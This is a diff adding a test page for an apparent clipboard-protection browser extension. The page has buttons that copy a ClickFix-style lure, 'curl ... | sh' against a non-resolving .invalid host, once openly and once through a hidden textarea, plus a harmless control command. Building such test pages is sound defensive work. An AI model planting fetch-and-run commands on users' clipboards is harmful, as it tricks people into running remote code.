@@ -1,0 +1,56 @@
+<!doctype html>
+<!-- Harmless test page for the Separ browser extension (browser/README.md, manual test checklist).
+     Serve it from localhost:  python3 -m http.server --bind 127.0.0.1 --directory browser/test 8000
+     then open http://localhost:8000/clipboard-test.html. The "lure" commands name a host under
+     .invalid, which never resolves (RFC 6761); nothing here downloads or runs anything. -->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Separ clipboard test page</title>
+<style>
+  body { font: 16px/1.5 system-ui, sans-serif; max-width: 46rem; margin: 2rem auto; padding: 0 1rem; }
+  button { font: inherit; padding: .4rem .9rem; margin: .3rem 0; }
+  code { background: #f2f2f2; padding: .1rem .3rem; }
+  .case { border: 1px solid #ccc; border-radius: 6px; padding: .6rem 1rem; margin: 1rem 0; }
+</style>
+</head>
+<body>
+<h1>Separ clipboard test page</h1>
+<p>Each button puts text on the clipboard the way a web page can. Paste afterwards into a text
+editor (not a terminal) to see what the clipboard holds.</p>
+
+<div class="case">
+  <p><strong>1. ClickFix-style lure (writeText).</strong> Expected in block mode: the clipboard is
+  replaced by a warning sentence and a banner names a ClickFix-style command.</p>
+  <button id="lure">Copy the "fix" command</button>
+  <p><code>curl -s http://lure.example.invalid/x | sh</code></p>
+</div>
+
+<div class="case">
+  <p><strong>2. The same lure through a hidden text field (execCommand).</strong> Expected: as 1.</p>
+  <button id="lure-exec">Copy with execCommand</button>
+</div>
+
+<div class="case">
+  <p><strong>3. Something harmless.</strong> Expected: nothing happens; the clipboard holds
+  <code>git status</code>.</p>
+  <button id="benign">Copy "git status"</button>
+</div>
+
+<script>
+  const LURE = "curl -s http://lure.example.invalid/x | sh";
+  document.getElementById("lure").onclick = () => navigator.clipboard.writeText(LURE);
+  document.getElementById("benign").onclick = () => navigator.clipboard.writeText("git status");
+  document.getElementById("lure-exec").onclick = () => {
+    const t = document.createElement("textarea");
+    t.value = LURE;
+    t.style.position = "fixed";
+    t.style.opacity = "0";
+    document.body.appendChild(t);
+    t.select();
+    document.execCommand("copy");
+    t.remove();
+  };
+</script>
+</body>
+</html>
